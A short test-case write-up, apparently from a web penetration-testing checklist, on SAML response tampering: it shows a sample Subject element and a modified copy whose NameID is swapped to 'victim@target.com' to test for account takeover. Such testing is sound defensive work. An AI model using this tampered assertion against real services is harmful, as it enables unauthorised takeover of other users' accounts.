
###  Replacing the value of  Name Identifier in Subject element
<hr>

This test case is all about replacing the value of Name Identifier returned by the IDP in Subject element.

Let's say, web application asked IDP to return user ID or email address after successfull authentication. The value will be in enclosed in below mentioned tags:

     <saml:Subject><saml:NameID>  <saml:Subject><saml:NameID> 

Sample:

    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">user@target.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData
          InResponseTo="_b083bff2-7a09-409c-9590-55316baafaae"
          NotOnOrAfter="2023-05-27T21:26:37Z" Recipient="http://web_application/saml/consume"/>
      </SubjectConfirmation>
    </Subject>
<hr></hr>

#### Attack scenario:
Now, to check if account take over can happen, replace the value of Name identifier with victim user account ID or email. 

Here is an example:

    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">victim@target.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData
          InResponseTo="_b083bff2-7a09-409c-9590-55316baafaae"
          NotOnOrAfter="2023-05-27T21:26:37Z" Recipient="http://web_application/saml/consume"/>
      </SubjectConfirmation>
    </Subject>



